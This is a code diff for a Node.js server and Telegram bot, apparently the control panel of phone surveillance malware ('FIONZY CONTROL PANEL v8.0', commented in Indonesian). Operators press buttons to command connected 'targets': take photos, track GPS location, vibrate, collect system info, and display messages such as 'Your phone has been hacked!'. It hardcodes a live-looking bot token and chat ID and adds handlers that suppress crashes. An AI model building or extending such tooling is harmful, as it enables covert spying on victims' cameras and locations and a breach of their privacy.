@@ -7,54 +7,60 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: "*" } });
 
-// === ⚡ KONFIGURASI BOT (GANTI DI SINI!) ⚡ ===
-const BOT_TOKEN = '8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA'; // Ganti dengan token @BotFather
+// === ⚡ KONFIGURASI (ISI TOKEN TUAN!) ⚡ ===
+const BOT_TOKEN = '8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA'; 
 const bot = new Telegraf(BOT_TOKEN);
 
-// UI Menu Utama
-const mainMenu = (ctx) => {
-    ctx.replyWithMarkdownV2(
-        `⚡ *FIONZY CONTROL PANEL v7\\.0* ⚡\n` +
-        `──────────────\n` +
-        `📱 *Status:* ONLINE\n` +
-        `🛡️ *Protocol:* SECURE\n` +
-        `──────────────\n` +
-        `*Silahkan pilih perintah kendali:*`,
-        Markup.inlineKeyboard([
-            [Markup.button.callback('📸 Take Photo', 'snap'), Markup.button.callback('📍 Track GPS', 'gps')],
-            [Markup.button.callback('📳 Vibrate', 'vibrate'), Markup.button.callback('🔋 System Info', 'info')],
-            [Markup.button.callback('💬 Send Toast', 'ask_toast'), Markup.button.callback('🔄 Refresh', 'menu')]
-        ])
-    );
+// UI Menu Utama Anti-Error
+const mainMenu = async (ctx) => {
+    const text = `⚡ *FIONZY CONTROL PANEL v8\\.0* ⚡\n` +
+                 `──────────────\n` +
+                 `📱 *Status:* ONLINE\n` +
+                 `🛡️ *Protocol:* ULTRA SECURE\n` +
+                 `──────────────\n` +
+                 `*Pilih Perintah Kendali:*`;
+    const keyboard = Markup.inlineKeyboard([
+        [Markup.button.callback('📸 Take Photo', 'snap'), Markup.button.callback('📍 Track GPS', 'gps')],
+        [Markup.button.callback('📳 Vibrate', 'vibrate'), Markup.button.callback('🔋 System Info', 'info')],
+        [Markup.button.callback('💬 Send Toast', 'ask_toast'), Markup.button.callback('🔄 Refresh', 'menu')]
+    ]);
+    try {
+        await ctx.replyWithMarkdownV2(text, keyboard);
+    } catch (e) { console.log("Gagal kirim menu: " + e.message); }
 };
 
-// Logika Socket
+// Logika Socket & Notifikasi Target Masuk
 io.on('connection', (socket) => {
-    console.log('⚡ Target Terkoneksi!');
-    bot.telegram.sendMessage(7373392803, "✅ **Target Baru Terdeteksi!**\nSilahkan buka /menu", { parse_mode: 'Markdown' });
+    console.log('⚡ Target Baru Terhubung!');
+    // Kirim notif ke bot (Ganti ID jika perlu)
+    bot.telegram.sendMessage(ctx?.chat?.id || '7373392803', "✅ **TARGET BARU ONLINE!**\nKetik /menu untuk kendali.", { parse_mode: 'Markdown' }).catch(() => {});
 });
 
 bot.start((ctx) => mainMenu(ctx));
 bot.command('menu', (ctx) => mainMenu(ctx));
 
-// Handler Tombol
-bot.action('snap', (ctx) => { io.emit('command', '/snap'); ctx.answerCbQuery('📸 Meminta Foto...'); });
-bot.action('gps', (ctx) => { io.emit('command', '/gps'); ctx.answerCbQuery('📍 Melacak Lokasi...'); });
-bot.action('vibrate', (ctx) => { io.emit('command', '/vibrate'); ctx.answerCbQuery('📳 Bergetar!'); });
-bot.action('info', (ctx) => { io.emit('command', '/info'); ctx.answerCbQuery('🔋 Mengambil Info...'); });
+// Handler Tombol (Dibuat Cepat agar tidak expired)
+bot.action('snap', (ctx) => { ctx.answerCbQuery('📸 Meminta Foto...').catch(() => {}); io.emit('command', '/snap'); });
+bot.action('gps', (ctx) => { ctx.answerCbQuery('📍 Melacak GPS...').catch(() => {}); io.emit('command', '/gps'); });
+bot.action('vibrate', (ctx) => { ctx.answerCbQuery('📳 Bergetar!').catch(() => {}); io.emit('command', '/vibrate'); });
+bot.action('info', (ctx) => { ctx.answerCbQuery('🔋 Mengambil Info...').catch(() => {}); io.emit('command', '/info'); });
 bot.action('menu', (ctx) => mainMenu(ctx));
-bot.action('ask_toast', (ctx) => ctx.reply("Ketik: `/toast [pesan]`\nContoh: `/toast Anda Diretas!`", { parse_mode: 'Markdown' }));
+bot.action('ask_toast', (ctx) => ctx.reply("Ketik: `/toast [pesan]`\nContoh: `/toast HP Anda Diretas!`"));
 
-// Handler Pesan Teks (Toast)
+// Handler Toast & Anti-Crash
 bot.on('text', (ctx) => {
     if (ctx.message.text.startsWith('/toast ')) {
         io.emit('command', ctx.message.text);
-        ctx.reply("✅ Toast Terkirim!");
+        ctx.reply("✅ Toast Terkirim ke Target!");
     }
 });
 
+// PELINDUNG ANTI-CRASH (Wajib ada!)
+process.on('uncaughtException', (err) => { console.log('❌ Error Dicegah: ' + err.message); });
+process.on('unhandledRejection', (res) => { console.log('❌ Rejection Dicegah: ' + res); });
+
 server.listen(3000, '0.0.0.0', () => {
-    console.log('⚡ SERVER FIONZY AKTIF DI PORT 3000');
-    console.log('⚡ BOT TELEGRAM: ONLINE');
+    console.log('⚡ SERVER FIONZY v8.0 AKTIF');
+    console.log('⚡ PORT: 3000 | BOT: ONLINE');
 });
-bot.launch();
+bot.launch().catch(e => console.log("Bot gagal jalan: " + e.message));
